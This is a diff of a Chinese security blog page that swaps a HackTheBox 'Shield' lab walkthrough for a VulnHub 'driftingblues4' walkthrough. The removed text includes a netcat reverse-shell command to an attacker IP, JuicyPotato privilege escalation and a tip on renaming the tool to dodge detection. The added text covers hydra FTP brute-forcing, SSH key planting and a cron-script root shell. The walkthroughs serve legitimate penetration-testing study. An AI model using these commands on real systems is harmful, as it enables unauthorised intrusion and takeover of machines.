@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>HackTheBox-Shield | colind0pe&#39;s blog</title>
-  <meta name="keywords" content=" HackTheBox ">
-  <meta name="description" content="HackTheBox-Shield | colind0pe&#39;s blog">
+  <title>driftingblues4 VulnHub Walkthrough | colind0pe&#39;s blog</title>
+  <meta name="keywords" content=" VulnHub ">
+  <meta name="description" content="driftingblues4 VulnHub Walkthrough | colind0pe&#39;s blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="个人简介colind0pe, 网络空间安全专业本科在读，目前从事安全方面的实习工作 联系我WeChat：hl_lhcq 邮箱：&amp;#49;&amp;#51;&amp;#x37;&amp;#x30;&amp;#50;&amp;#x32;&amp;#x37;&amp;#x39;&amp;#x39;&amp;#54;&amp;#64;&amp;#x71;&amp;#x71;&amp;#x2e;&amp;#99;&amp;#x6f;&amp;#x6d;">
 <meta property="og:type" content="website">
@@ -320,9 +320,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-HackTheBox-Shield" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-driftingblues4-VulnHub-Walkthrough" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">HackTheBox-Shield</h1>
+        <h1 class="article-title">driftingblues4 VulnHub Walkthrough</h1>
     
     <div class="article-meta">
         
@@ -340,19 +340,19 @@
         <span class="tag">
             <i class="iconfont icon-tag"></i>
             
-            <a class="color1">HackTheBox</a>
+            <a class="color3">VulnHub</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2021-09-30 21:32:02'>2021-08-18 17:05</time>
+            发布时间 : <time class="date" title='最后更新: 2021-11-01 14:45:22'>2021-10-14 15:49</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:359</span>
+        <span>字数:527</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -382,7 +382,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="toc-text">实验环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B"><span class="toc-text">实验过程</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%B1%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4"><span class="toc-text">弱密码爆破</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SSH%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95"><span class="toc-text">SSH免密登录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-text">权限提升</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -398,58 +398,94 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p><img src="https://i.loli.net/2021/08/18/JNCVaw9LHIbsg3t.png"></p>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><strong>端口扫描</strong>：</p>
-<pre><code>namp -A -T4 10.10.10.29
+        <h4 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h4><pre><code>arp-scan -l
 </code></pre>
-<p>发现80、3306两个端口，IIS 10.0和MySQL，服务器操作系统为Windows</p>
-<p><img src="https://i.loli.net/2021/08/18/HW1B7cVIfSkOhjw.png"></p>
-<p><code>--script vuln</code>参数扫描常见漏洞 ，发现wordpress目录，已经扫到了登录地址</p>
-<p><img src="https://i.loli.net/2021/08/18/sWYHtKiGoMcAaBZ.png"></p>
-<p><strong>目录扫描</strong>，也发现wordpress目录</p>
-<p><img src="https://i.loli.net/2021/08/18/BjKiP1malH3YsuM.png"></p>
-<p><strong>Wpscan分析</strong>，可以看到wordpress的版本</p>
-<pre><code>wpscan --url http://10.10.10.29/wordpress
+<img src="https://i.loli.net/2021/10/14/zhRLGB6DEPml2uv.png" style="zoom:67%;" />
+
+<h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><pre><code>nmap -sC -sV -p- 192.168.62.174
 </code></pre>
-<p><img src="https://i.loli.net/2021/08/18/o7IeKRkylwbXUn9.png"></p>
-<h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><p>用上一台靶机的账号密码可以登录后台<code>admin</code>:<code>P@s5w0rd!</code></p>
-<p><img src="https://i.loli.net/2021/08/18/h7Av2EPBGHcOQus.png"></p>
-<p>知道wordpress admin用户密码的情况下，可以使用msf的wp_admin_shell_upload模块来攻击，使用模块</p>
-<p><img src="https://i.loli.net/2021/08/18/DvtE9xOQMcVGirR.png"></p>
-<p>设置参数</p>
-<p><img src="https://i.loli.net/2021/08/18/HdxmVPoLYhGXpQi.png"></p>
-<p>执行exploit命令后，获得shell</p>
-<p><img src="https://i.loli.net/2021/08/18/IEwiRplZgf9TKaG.png"></p>
-<p>在shell中执行命令</p>
-<p><img src="https://i.loli.net/2021/08/18/srdiD4wGRj6Y28b.png"></p>
-<p>查看wp-config.php，发现敏感信息</p>
-<p><img src="https://i.loli.net/2021/08/18/VhwTivWuomxFJ6P.png"></p>
-<p><strong>反弹shell</strong>：</p>
-<p>在kali终端输入nc -nlvp 1234，用来在本机启动一个监听端口</p>
-<p><img src="https://i.loli.net/2021/08/18/vxTqUfBDVaeGoh9.png"></p>
-<p>在meterpreter中执行nc命令来连接本机监听端口，使用netcat获得windows shell</p>
-<p><img src="https://i.loli.net/2021/08/18/1pl42ztmeAabDH6.png"></p>
-<p><img src="https://i.loli.net/2021/08/18/3NOZ5os7CcgDY6i.png"></p>
-<p>查看当前用户</p>
-<p><img src="https://i.loli.net/2021/08/18/iBAZEls5vNMDaCV.png"></p>
-<p><strong>提权:</strong></p>
-<p>使用juicy-potato提权，将JuicyPotato.exe重命成js.exe，防止被对方检测到</p>
-<p>将js.exe上传到对方机器</p>
-<p><img src="https://i.loli.net/2021/08/18/DnehVMrIUajwFxO.png"></p>
-<p>在windows shell中生成一个bat脚本：</p>
-<pre><code>echo START C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e powershell.exe 10.10.14.107 1111 &gt; shell.bat
+<img src="https://i.loli.net/2021/10/14/zLTuWXdBhYVneoM.png" style="zoom: 67%;" />
+
+<p>开放了21、22、80端口，先看了下21端口，发现需要密码</p>
+<img src="https://i.loli.net/2021/10/14/eoD7OHbsxQdl945.png" style="zoom:67%;" />
+
+<p>再访问一下80端口，看看有没有什么信息</p>
+<p><img src="https://i.loli.net/2021/10/14/RutLqmjfi95sKAS.png"></p>
+<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>主页没有什么信息，看一下源码</p>
+<p><img src="https://i.loli.net/2021/10/14/y43jOYEQP1Wtmrz.png"></p>
+<p>base64编码，到在线网站转换一下</p>
+<img src="https://i.loli.net/2021/10/14/iPnKaR3Hxc45Q9r.png" style="zoom:50%;" />
+
+<p>再转换一次</p>
+<img src="https://i.loli.net/2021/10/14/ITbCv2kKSmcjZhH.png" style="zoom:50%;" />
+
+<p>emmm，继续</p>
+<img src="https://i.loli.net/2021/10/14/bLqOkQABpI4UN6v.png" style="zoom:50%;" />
+
+<img src="https://i.loli.net/2021/10/14/KkXxDfubgw8l7BE.png" style="zoom:50%;" />
+
+<p>最后得到一个txt的路径，访问一下</p>
+<img src="https://i.loli.net/2021/10/14/sLfinMZNFSBem8y.png" style="zoom: 67%;" />
+
+<p>Brainfuck加密，到在线网站解密一下</p>
+<p><img src="https://i.loli.net/2021/10/14/k8BNGWeDhpK4HcX.png"></p>
+<p>得到了一张图片的路径，访问一下</p>
+<p>是一个二维码</p>
+<img src="https://i.loli.net/2021/10/14/S1lyGvhiRO5VoWk.png" style="zoom: 33%;" />
+
+<p>扫描的结果是一张图片地址</p>
+<img src="https://i.loli.net/2021/10/14/ri9wbhBXtmn21Wv.png" style="zoom:80%;" />
+
+<p>访问一下</p>
+<img src="https://i.imgur.com/a4JjS76.png" alt="img" style="zoom: 67%;" />
+
+<h4 id="弱密码爆破"><a href="#弱密码爆破" class="headerlink" title="弱密码爆破"></a>弱密码爆破</h4><p>提示了几个名字，试了ssh是不支持密码登录的，那就拿来爆破ftp试试</p>
+<pre><code>hydra -L /home/colin/桌面/user -P /usr/share/wordlists/rockyou.txt ftp://192.168.62.174
 </code></pre>
-<p><img src="https://i.loli.net/2021/08/18/fZpgGSrAEs9dial.png"></p>
-<p>在本机使用nc创建一个监听端口，用来接收提权后的windows shell</p>
-<p><img src="https://i.loli.net/2021/08/18/bWQDZ2VAGyPEIUl.png"></p>
-<p>运行juicy-potato提权：</p>
-<pre><code>js.exe -t * -p C:\inetpub\wwwroot\wordpress\wp-content\uploads\shell.bat -l 1337
-</code></pre>
-<p><img src="https://i.loli.net/2021/08/18/4oZuXGiTzAqLfr9.png"></p>
-<p>获得system权限的windows shell</p>
-<p><img src="https://i.loli.net/2021/08/18/8kDL9GwTJj2mexP.png"></p>
-<p>在管理员账户的桌面目录下找到flag</p>
-<p><img src="https://i.loli.net/2021/08/18/MVPFeo2z4nisyDp.png"></p>
+<p><img src="https://i.loli.net/2021/10/14/TGkAwWjDZs5zoOQ.png"></p>
+<p>成功得到了ftp的用户名和密码</p>
+<p>用得到的用户名和密码成功登录ftp</p>
+<img src="https://i.loli.net/2021/10/14/YBD1hf4sIgpbxve.png" style="zoom:80%;" />
+
+<p>看了一下好像没有什么信息，但是发现这个hubert目录是有写权限的，我们可以写一个ssh的key上去，然后在本地免密登录</p>
+<h4 id="SSH免密登录"><a href="#SSH免密登录" class="headerlink" title="SSH免密登录"></a>SSH免密登录</h4><p>先在靶机的hubert目录下创建一个.ssh目录</p>
+<p><img src="https://i.loli.net/2021/10/14/pCZK8LhMB3wRJH5.png"></p>
+<p>将本地的authorized_keys上传到靶机</p>
+<img src="https://i.loli.net/2021/10/14/T4Uo7cedGDLgWOC.png" style="zoom: 80%;" />
+
+<p>成功登录到ssh</p>
+<img src="https://i.loli.net/2021/10/14/kiIhwnUrsYcEjJu.png" style="zoom:80%;" />
+
+<p>现在可以获取第一个flag了</p>
+<img src="https://i.loli.net/2021/10/14/vQgpersjXcqxK7W.png" style="zoom: 67%;" />
+
+<h4 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h4><p>/home/hubert目录下还有一个python脚本</p>
+<p><img src="https://i.loli.net/2021/10/14/zw8cIdiTj2N45Q6.png"></p>
+<p>查看一下内容</p>
+<img src="https://i.loli.net/2021/10/14/f9envx2HlPkoIVh.png" style="zoom:67%;" />
+
+<p>执行脚本会以root权限执行一个命令，将1输出到一个文件里，去看一下这个文件</p>
+<img src="https://i.loli.net/2021/10/14/9KScPokfV6iRd4B.png" style="zoom:80%;" />
+
+<p>这个文件里已经有很多个1了，上面的python脚本应该是一直在执行的</p>
+<p>将进程监控工具上传到靶机，看一下这个脚本的运行情况</p>
+<p>先在本机起一个http服务</p>
+<p><img src="https://i.loli.net/2021/10/14/lI4oASmUELGV5y1.png"></p>
+<p>在靶机下载，并赋予执行权限</p>
+<img src="https://i.loli.net/2021/10/14/zFAc2jdn5OeKxyR.png" style="zoom:80%;" />
+
+<p>发现emergency.py是每分钟执行一次的</p>
+<img src="https://i.loli.net/2021/10/14/9a6mWdXpPG34buf.png" style="zoom: 67%;" />
+
+<p>接下来尝试通过新建一个emergency.py来提权</p>
+<img src="https://i.loli.net/2021/10/14/Eglnj4rwqHaeAOo.png" style="zoom: 67%;" />
+
+<p>在本地开启一个监听端口来接收反弹的shell</p>
+<p><img src="https://i.loli.net/2021/10/14/2vdQToUR1Bs5C3b.png"></p>
+<p>等了一会之后，本地已经接收到了shell</p>
+<p><img src="https://i.loli.net/2021/10/14/DIiKmceuLlbyo1X.png"></p>
+<p>成功获取第二个flag</p>
+<img src="https://i.loli.net/2021/10/14/QaX6UVWEoTiO5F3.png" style="zoom:67%;" />
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 1370227996@qq.com </span>
